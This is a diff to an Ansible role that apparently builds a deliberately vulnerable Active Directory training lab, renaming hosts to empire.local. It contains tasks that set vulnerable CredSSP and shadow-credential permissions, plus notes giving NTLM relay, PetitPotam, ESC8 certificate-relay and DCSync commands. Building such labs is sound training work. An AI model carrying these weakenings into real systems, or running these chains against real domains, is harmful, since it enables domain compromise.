@@ -2,18 +2,18 @@
 # ==============================================================================
 # vuln_lat_ext/tasks/relay.yml
 # NTLM relay precondition configuration
-# Targets: all_dcs + file01.corp.local (via main.yml guard)
+# Targets: all_dcs + scarif.empire.local (via main.yml guard)
 #
 # LAT-011  LDAP signing not enforced on DCs (no enforce)
 # LAT-012  LDAP channel binding disabled
-# LAT-013  SMB1 + signing off on file01 (relay target)
+# LAT-013  SMB1 + signing off on scarif (relay target)
 # LAT-014  Cross-protocol relay: LDAP signing off, SMB signing off
-# LAT-015  CredSSP AllowEncryptionOracle=2 on file01 (CVE-2018-0886 surface)
-# LAT-016  Shadow credentials surface (KeyCredentialLink write on ws01$)
+# LAT-015  CredSSP AllowEncryptionOracle=2 on scarif (CVE-2018-0886 surface)
+# LAT-016  Shadow credentials surface (KeyCredentialLink write on tatooine$)
 # LAT-017  Unconstrained delegation coercion + relay chain note
 # LAT-018  NTLMv2 capture via Responder + relay to LDAPS
 # LAT-019  Cross-forest NTLM relay (SID filtering off — see ad_trust)
-# LAT-020  NTLM relay to ADCS HTTP enrollment (ca01 ESC8)
+# LAT-020  NTLM relay to ADCS HTTP enrollment (endor ESC8)
 # ==============================================================================
 
 # LAT-011: LDAP signing — already configured by vuln_cred_access role.
@@ -31,8 +31,8 @@
   failed_when: lat011_check.rc != 0
   when: inventory_hostname in groups['all_dcs'] | default([])
 
-# LAT-015: CredSSP AllowEncryptionOracle on file01
-- name: LAT-015 - Check CredSSP AllowEncryptionOracle on file01
+# LAT-015: CredSSP AllowEncryptionOracle on scarif
+- name: LAT-015 - Check CredSSP AllowEncryptionOracle on scarif
   ansible.windows.win_shell: |
     $v = (Get-ItemProperty `
             -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' `
@@ -41,7 +41,7 @@
   register: lat015_check
   changed_when: false
   failed_when: lat015_check.rc != 0
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
 
 - name: LAT-015 - Set AllowEncryptionOracle=2 (vulnerable CredSSP)
   ansible.windows.win_regedit:
@@ -50,14 +50,14 @@
     data: 2
     type: dword
   when:
-    - inventory_hostname == 'file01.corp.local'
+    - inventory_hostname == 'scarif.empire.local'
     - lat015_check.stdout | trim != '2'
 
-# LAT-016: Shadow credentials — KeyCredentialLink WriteProperty on ws01$.
-- name: LAT-016 - Check KeyCredentialLink write on ws01$ for HelpDesk
+# LAT-016: Shadow credentials — KeyCredentialLink WriteProperty on tatooine$.
+- name: LAT-016 - Check KeyCredentialLink write on tatooine$ for HelpDesk
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    $ws = Get-ADComputer -Identity 'ws01' -ErrorAction SilentlyContinue
+    $ws = Get-ADComputer -Identity 'tatooine' -ErrorAction SilentlyContinue
     if (-not $ws) { Write-Output "ws01_not_found"; exit 0 }
     $acl = Get-ACL "AD:$($ws.DistinguishedName)"
     $found = $acl.Access | Where-Object {
@@ -68,13 +68,13 @@
   register: lat016_check
   changed_when: false
   failed_when: lat016_check.rc != 0
-  when: inventory_hostname == 'dc01.corp.local'
+  when: inventory_hostname == 'coruscant.empire.local'
 
-- name: LAT-016 - Grant HelpDesk WriteProperty on ws01$ KeyCredentialLink
+- name: LAT-016 - Grant HelpDesk WriteProperty on tatooine$ KeyCredentialLink
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     try {
-      $ws  = Get-ADComputer -Identity 'ws01' -ErrorAction Stop
+      $ws  = Get-ADComputer -Identity 'tatooine' -ErrorAction Stop
       $grp = Get-ADGroup -Identity 'HelpDesk' -ErrorAction Stop
       $sid = $grp.SID
       # msDS-KeyCredentialLink attribute OID: {5b47d60f-6090-40b2-9f37-2a4de88f3063}
@@ -87,7 +87,7 @@
       $obj = [ADSI]"LDAP://$($ws.DistinguishedName)"
       $obj.ObjectSecurity.AddAccessRule($ace)
       $obj.CommitChanges()
-      Write-Output "changed: HelpDesk WriteProperty on ws01$ KeyCredentialLink"
+      Write-Output "changed: HelpDesk WriteProperty on tatooine$ KeyCredentialLink"
     } catch {
       Write-Output "WARN: $($_.Exception.Message)"
     }
@@ -95,7 +95,7 @@
   changed_when: "'changed:' in lat016_set.stdout"
   failed_when: lat016_set.rc != 0
   when:
-    - inventory_hostname == 'dc01.corp.local'
+    - inventory_hostname == 'coruscant.empire.local'
     - "'absent' in lat016_check.stdout"
     - "'ws01_not_found' not in lat016_check.stdout"
 
@@ -107,19 +107,19 @@
       LAT-017: Unconstrained Delegation + Coercion Chain
       =====================================================
       Machine accounts with TrustedForDelegation=True in this lab:
-        - svc_coerce$ (corp.local — set by vuln_persistence_ext PER-037)
-        - dc01$ (Domain Controller — always has unconstrained delegation)
+        - svc_coerce$ (empire.local — set by vuln_persistence_ext PER-037)
+        - coruscant$ (Domain Controller — always has unconstrained delegation)
 
       Attack:
-        1. Coerce dc01$ via PetitPotam/PrinterBug to authenticate to svc_coerce$
-        2. svc_coerce$ caches dc01$'s TGT in its TGT cache
+        1. Coerce coruscant$ via PetitPotam/PrinterBug to authenticate to svc_coerce$
+        2. svc_coerce$ caches coruscant$'s TGT in its TGT cache
         3. Extract TGT with: Rubeus dump /service:krbtgt
         4. DCSync with extracted DA TGT
 
       Also: SYSVOL/NetLogon path coercion via script UNC references (REC-015).
 
       Tools: Rubeus monitor /interval:5 /nowrap + impacket-PetitPotam
-  when: inventory_hostname == 'dc01.corp.local'
+  when: inventory_hostname == 'coruscant.empire.local'
 
 # LAT-020: NTLM relay to ADCS HTTP enrollment note.
 - name: LAT-020 - Drop ADCS relay chain note (ESC8 relay)
@@ -128,19 +128,19 @@
     content: |
       LAT-020: NTLM Relay to ADCS HTTP Enrollment (ESC8)
       =====================================================
-      ca01.corp.local has HTTP enrollment enabled (port 80 — vuln_adcs ESC8).
+      endor.empire.local has HTTP enrollment enabled (port 80 — vuln_adcs ESC8).
       No EPA (Extended Protection for Authentication) on the enrollment endpoint.
 
       Chain:
         1. Coerce DC via PetitPotam/PrinterBug to attacker listener
-        2. Relay captured NTLM auth to http://ca01.corp.local/certsrv/certfnsh.asp
+        2. Relay captured NTLM auth to http://endor.empire.local/certsrv/certfnsh.asp
         3. Enroll certificate for the coerced DC account
         4. Use DC certificate for PKINIT → extract DC's NT hash (UnPAC-the-Hash)
         5. DCSync with DC NT hash
 
       Tools:
-        ntlmrelayx.py --target http://ca01.corp.local/certsrv/certfnsh.asp \
+        ntlmrelayx.py --target http://endor.empire.local/certsrv/certfnsh.asp \
           --adcs --template DomainController
-        impacket-PetitPotam attacker_ip dc01.corp.local
-        certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
-  when: inventory_hostname == 'dc01.corp.local'
+        impacket-PetitPotam attacker_ip coruscant.empire.local
+        certipy auth -pfx coruscant.pfx -dc-ip 10.10.0.10
+  when: inventory_hostname == 'coruscant.empire.local'
